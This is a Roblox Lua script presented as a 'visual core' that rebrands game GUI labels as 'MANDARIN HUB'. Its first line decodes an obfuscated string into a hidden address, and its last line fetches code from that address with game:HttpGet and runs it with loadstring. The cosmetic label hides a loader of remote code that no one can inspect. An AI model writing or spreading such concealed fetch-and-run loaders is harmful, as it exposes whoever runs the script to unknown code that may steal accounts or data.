
--[[ STAGE 2: VISUAL CORE ]]
local EZUyvSBWqEQBIfQ="\220\194\196\202\207\024\039\041\212\231\219\214\233\240\249\248\058\249\255\255\067\240\001\241\075\017\002\034\059\064\028\034\023"local NsIzbZw1zf5dqoP=244 local yPvvl9QH8V52LoMjeYj0co=49 local VFrufjfQARON_uJ2bV=0 local A1uRqedOZ815kMEgllV=2 local rEgcP_Yqcn0WApb4B=13 local WODWsNv3fHz3=false local IX5_4MVqIhQPq=bit32 and bit32.bxor if not IX5_4MVqIhQPq then IX5_4MVqIhQPq=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local bjRDCF7Ev0LwQu={}for EZ1Ety9VDlY3l=1,#EZUyvSBWqEQBIfQ do local dLLti7q_ngfaE=string.byte(EZUyvSBWqEQBIfQ,EZ1Ety9VDlY3l)local C9QwxZvvcR237XdCCNF01Q=(yPvvl9QH8V52LoMjeYj0co+(EZ1Ety9VDlY3l*A1uRqedOZ815kMEgllV)+rEgcP_Yqcn0WApb4B)%256 if VFrufjfQARON_uJ2bV==0 then dLLti7q_ngfaE=(dLLti7q_ngfaE-C9QwxZvvcR237XdCCNF01Q)%256 bjRDCF7Ev0LwQu[EZ1Ety9VDlY3l]=string.char(IX5_4MVqIhQPq(dLLti7q_ngfaE,NsIzbZw1zf5dqoP))else dLLti7q_ngfaE=IX5_4MVqIhQPq(dLLti7q_ngfaE,NsIzbZw1zf5dqoP)bjRDCF7Ev0LwQu[EZ1Ety9VDlY3l]=string.char((dLLti7q_ngfaE-C9QwxZvvcR237XdCCNF01Q)%256)end end local gmRqCcV9X6dQmwAtxGxQ=table.concat(bjRDCF7Ev0LwQu)if WODWsNv3fHz3 then gmRqCcV9X6dQmwAtxGxQ=string.reverse(gmRqCcV9X6dQmwAtxGxQ)end local f_fmhgYxdZXQpmmXs006f=gmRqCcV9X6dQmwAtxGxQ
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(f_fmhgYxdZXQpmmXs006f))()
